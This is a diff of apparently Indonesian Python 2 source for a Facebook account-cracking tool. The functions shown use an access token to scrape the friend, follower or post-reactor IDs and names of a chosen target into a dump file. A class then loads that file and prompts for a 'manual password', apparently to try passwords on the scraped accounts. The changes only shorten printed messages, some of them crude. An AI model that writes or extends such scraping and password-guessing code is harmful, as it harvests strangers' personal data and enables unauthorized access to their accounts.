@@ -121,7 +121,7 @@ def publik(romz,headers=header):
         os.mkdir('dump')
     except:pass
     try:
-    	print ("\n%s╔══[%s•%s] Ketik '%sme%s' jika ingin dump daftar teman sendiri "%(P,M,P,H,P))
+    	print ("\n%s╔══[%s•%s] Ketik '%sme%s' jika ingin dump teman sendiri "%(P,M,P,H,P))
         idt = raw_input('╠══[?] Target id : %s'%(K))
         gas = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt,romz))
         nm = json.loads(gas.text)
@@ -132,7 +132,7 @@ def publik(romz,headers=header):
         for a in z['friends']['data']:
             id.append(a['id'] + '<=>' + a['name'])
             aang.write(a['id'] + '<=>' + a['name'] + '\n')
-            print '\r%s╚══[•] mohon sabar sedang dump id :%s %s ' % (P,H,str(len(id))),
+            print '\r%s╚══[•] sabar sedang dump id :%s %s ' % (P,H,str(len(id))),
             sys.stdout.flush();jeda(0.0050)
         aang.close()
         print ('\n \n%s╔══[%s✓%s] Succes dump id dari %s%s'%(P,H,P,H,nm['name']))
@@ -159,7 +159,7 @@ def followers(romz,headers=header):
         for a in z['data']:
             id.append(a['id'] + '<=>' + a['name'])
             aang.write(a['id'] + '<=>' + a['name'] + '\n')
-            print '\r%s╚══[•] mohon sabar sedang dump id :%s %s ' % (P,H,str(len(id))),
+            print '\r%s╚══[•] sabar sedang dump id :%s %s ' % (P,H,str(len(id))),
             sys.stdout.flush();jeda(0.0050)
         aang.close()
         print ('\n\n%s╔══[%s✓%s] Succes dump id dari %s%s'%(P,H,P,H,nm['name']))
@@ -185,7 +185,7 @@ def postingan(romz,headers=header):
         for a in z['data']:
             id.append(a['id'] + '<=>' + a['name'])
             aang.write(a['id'] + '<=>' + a['name'] + '\n')
-            print '\r%s╚══[•] mohon sabar sedang dump id :%s %s ' % (P,H,str(len(id))),
+            print '\r%s╚══[•] sabar sedang dump id :%s %s ' % (P,H,str(len(id))),
             sys.stdout.flush();jeda(0.0050)
         aang.close()
         print ('\n\n%s╔══[%s✓%s] Succes dump id postingan '%(P,H,P))
@@ -205,7 +205,7 @@ class ngentod:
             self.id = open(self.apk).read().splitlines()
             print '%s╠══[%s•%s] total id : %s%s' %(P,K,P,H,len(self.id))
         except:
-            print '\n%s╠══[!] File dump tidak ada, dump id dulu lah kentod'%(M)
+            print '\n%s╠══[!] File tidak ada, dump id dulu lah kentod'%(M)
             raw_input('\n%s╚══[ %sEnter %s] '%(P,K,P));menu()
         aangxnisa = raw_input('%s╚══[?] ingin menggunakan password manual? [y/t] :%s '%(P,K))
         if aangxnisa in ('Y', 'y'):
